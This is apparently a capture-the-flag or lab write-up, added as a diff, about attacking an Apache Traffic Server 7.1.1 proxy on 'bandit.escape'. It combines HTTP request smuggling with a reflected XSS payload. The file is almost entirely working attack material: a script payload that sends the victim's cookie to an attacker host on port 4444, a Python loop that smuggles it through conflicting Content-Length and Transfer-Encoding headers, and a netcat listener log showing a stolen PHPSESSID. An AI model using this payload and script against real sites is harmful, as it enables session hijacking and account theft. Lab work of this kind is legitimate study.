@@ -1,0 +1,44 @@
+80/tcp open  http-proxy Apache Traffic Server 7.1.1 --> it has HTTP smuggling vulnerability
+
+XSS + HTTP smuggling (to get cookie)
+-------------------
+
+
+Reflected XSS payload ==> a"><script>document.write('<img+src="http://10.51.106.3:4444/test.gif?cookie=' + document.cookie + '"/>');</script>HTTP/1.1
+
+Attacker request
+----------------
+
+import requests
+
+url = "http://bandit.escape/"
+body = f"""0
+
+GET /?filter=a%22%3E%3Cscript%3Edocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2F10.51.106.3%3A4444%2Ftest.gif%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22%2F%3E%27%29%3B%3C%2Fscript%3E HTTP/1.1
+Whatever: """.replace('\n', '\r\n')
+
+headers = {
+	"Content-Length": str(len (body)),
+	"Transfer-Encoding": "chunked"
+}
+
+while True:
+	requests.get(url, headers=headers, data=body) 
+
+
+Server response 
+
+#nc -lvnp 444
+
+listening on [any] 4444 ...
+connect to [10.51.106.3] from (UNKNOWN) [10.201.108.103] 36414
+GET /test.gif?cookie=PHPSESSID=9768429523d045d960b0d0a2b9d741ae HTTP/1.1
+Host: 10.51.106.3:4444
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/114.0.5735.106 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://bandit.escape/
+Accept-Encoding: gzip, deflate
+
+
+cookie=PHPSESSID=9768429523d045d960b0d0a2b9d741ae
